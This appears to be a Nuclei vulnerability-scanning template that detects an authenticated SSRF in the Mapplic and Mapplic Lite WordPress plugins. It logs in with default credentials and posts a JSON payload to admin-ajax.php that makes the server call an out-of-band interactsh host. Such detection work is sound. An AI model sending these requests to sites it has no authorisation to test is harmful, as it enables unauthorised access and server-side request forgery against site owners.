id: mapplic-ssrf

info:
  name: Mapplic & Mapplic Lite - Authenticated SSRF via JSON
  author: Ritik Prajapati
  severity: high
  description: |
    Detects SSRF in Mapplic (v6.1) and Mapplic Lite (v1.0) WordPress plugins. The vulnerability exists in the 'map' parameter within the map configuration JSON, allowing attackers to trigger internal or external HTTP/DNS requests.
  reference:
    - https://packetstormsecurity.com/files/161920/
    - https://wpscan.com/vulnerability/7bdee32b-9036-4e13-9586-4d6a9a1159c6
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
    cwe-id: CWE-918
  tags: mapplic,ssrf,wordpress,authenticated,json,intrusive

variables:
  username: "admin"
  password: "password"
  json_payload: '{"mapwidth":"100","levels":[{"id":"pwn","title":"pwn","map":"http://{{interactsh-url}}/xss.svg"}]}'

requests:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In

      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=mapplic_save&data={{json_payload}}

    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
      - type: status
        status:
          - 200
